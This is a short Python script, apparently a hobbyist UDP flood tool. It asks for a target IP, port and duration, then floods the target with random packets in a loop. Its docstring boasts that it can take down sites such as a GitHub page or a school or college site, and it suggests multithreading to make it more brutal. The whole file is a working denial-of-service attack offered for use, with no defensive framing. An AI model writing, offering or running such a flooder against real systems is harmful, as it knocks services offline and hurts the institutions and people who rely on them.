import time
import socket
import random

"""
Sufficent to take down websites like your GitHub site or School and College site.
Use Multithreading to make it more brutual.
"""


client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

bytes = random._urandom(9999)


victim = input('Target IP:: ')
vport = int(input('PORT:: '))

duration = int(input('SECONDS: '))

timeout = time.time() + duration

while 1:
    if time.time()>timeout:
        break
    else:
        pass
    client.sendto(bytes, (victim, vport))

    print("Attacking\n")
